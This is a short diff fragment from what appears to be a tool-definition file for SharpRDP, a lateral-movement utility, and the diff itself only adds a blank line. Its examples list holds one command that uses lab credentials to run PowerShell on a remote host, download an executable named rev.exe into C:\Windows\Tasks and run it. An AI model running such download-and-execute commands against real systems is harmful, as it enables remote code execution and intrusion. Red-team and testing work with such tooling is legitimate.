@@ -81,3 +81,4 @@ args = ".\\SharpRDP.exe computername=<target-hostname> username=<domain\\user> p
 examples = [
     ".\\SharpRDP.exe computername=appsrv01 username=corp1\\dave password=lab command=\"powershell (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/rev.exe', 'C:\\Windows\\Tasks\\rev.exe'); C:\\Windows\\Tasks\\rev.exe\""
 ]
+
